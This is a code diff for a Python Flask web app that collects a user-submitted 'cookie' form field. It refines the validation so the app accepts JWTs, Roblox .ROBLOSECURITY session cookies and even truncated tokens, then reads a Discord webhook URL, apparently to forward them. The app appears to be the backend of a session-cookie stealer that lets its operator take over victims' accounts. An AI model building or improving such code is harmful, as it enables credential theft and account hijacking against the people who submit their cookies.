@@ -226,9 +226,10 @@ def is_valid_cookie(cookie):
     """
     Validate cookie and check if it's not expired
     Supports JWT tokens and session cookies with expiration
+    Returns tuple: (is_valid, is_expired, error_message)
     """
     if not cookie or len(cookie) < 10:
-        return False
+        return False, False, "Invalid cookie format"
     
     # Check if it's a JWT token (has 3 parts separated by dots)
     if cookie.count('.') == 2:
@@ -247,28 +248,30 @@ def is_valid_cookie(cookie):
                 current_time = int(time.time())
                 
                 if current_time >= exp_time:
-                    return False  # Token is expired
+                    return False, True, "Cookie has expired"  # Token is expired
             
-            return True  # Valid JWT token, not expired
+            return True, False, None  # Valid JWT token, not expired
             
         except (ValueError, json.JSONDecodeError, Exception):
-            return False  # Invalid JWT format
+            return False, False, "Invalid cookie format"  # Invalid JWT format
     
     # For non-JWT cookies, accept Roblox-style cookies and other formats
     # Accept Roblox .ROBLOSECURITY cookies (often start with _|WARNING:)
+    # Allow truncated cookies as long as they meet minimum requirements
     if cookie.startswith('_|WARNING:') and len(cookie) > 50:
-        return True
+        return True, False, None
     
     # Accept standard cookie formats
     cookie_pattern = r'^(session|token|auth|_token|user_token|access_token)=[A-Za-z0-9+/=_-]{10,}$'
     if re.match(cookie_pattern, cookie):
-        return True
+        return True, False, None
     
     # Accept any long alphanumeric string that could be a valid token
+    # Allow truncated cookies as long as they have some valid characters
     if len(cookie) >= 30 and any(c.isalnum() for c in cookie):
-        return True
+        return True, False, None
     
-    return False
+    return False, False, "Invalid cookie format"
 
 @app.route('/')
 def index():
@@ -347,34 +350,15 @@ def submit_form():
                 'message': 'Missing required field (cookie)'
             }), 400
         
-        # Check if cookie is expired (for JWT tokens)
-        if cookie.count('.') == 2:
-            try:
-                header, payload, signature = cookie.split('.')
-                payload += '=' * (-len(payload) % 4)
-                decoded_payload = base64.urlsafe_b64decode(payload)
-                payload_data = json.loads(decoded_payload)
-                
-                if 'exp' in payload_data:
-                    exp_time = payload_data['exp']
-                    current_time = int(time.time())
-                    if current_time >= exp_time:
-                        return jsonify({
-                            'success': False, 
-                            'message': 'Cookie has expired'
-                        }), 400
-            except:
-                return jsonify({
-                    'success': False, 
-                    'message': 'Invalid cookie format'
-                }), 400
+        # Comprehensive cookie validation
+        is_valid, is_expired, error_msg = is_valid_cookie(cookie)
         
-        # Validate cookie format
-        if not is_valid_cookie(cookie):
+        if not is_valid or is_expired:
             return jsonify({
                 'success': False, 
-                'message': 'Invalid cookie format'
+                'message': 'Your Cookie Was Expired Or Invalid'
             }), 400
+        
         
         # Get Discord webhook URL from environment
         webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
